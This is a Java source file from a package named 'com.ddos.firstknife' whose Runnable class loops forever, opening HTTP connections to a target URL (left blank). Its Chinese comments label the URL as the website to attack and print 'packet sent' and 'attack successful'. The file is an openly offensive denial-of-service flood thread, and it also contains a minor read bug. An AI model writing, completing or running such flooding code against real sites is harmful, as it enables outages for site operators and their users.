package com.ddos.firstknife;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

/**
 * @version 1.0
 * @description：
 * @author: Yang.Chang
 * @project: lancet
 * @package: com.ddos.firstknife
 * @email: cy880708@163.com
 * @date: 2018/9/21 下午2:21
 * @mofified By:
 */
public class Mythread implements Runnable {

    @Override
    public void run() {
        while (true) {
            try {
                //要攻击的目标网站
                URL url = new URL("");
                URLConnection conn = url.openConnection();
                System.out.println("发包成功！");
                BufferedInputStream bis = new BufferedInputStream(
                        conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();

                if (bis != null) {
                    if ((len = bis.read()) != -1) {
                        sb.append(new String(bytes, 0, len));
                        System.out.println("攻击成功！");
                        bis.close();
                    }
                }
            } catch (MalformedURLException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

        }
    }

}
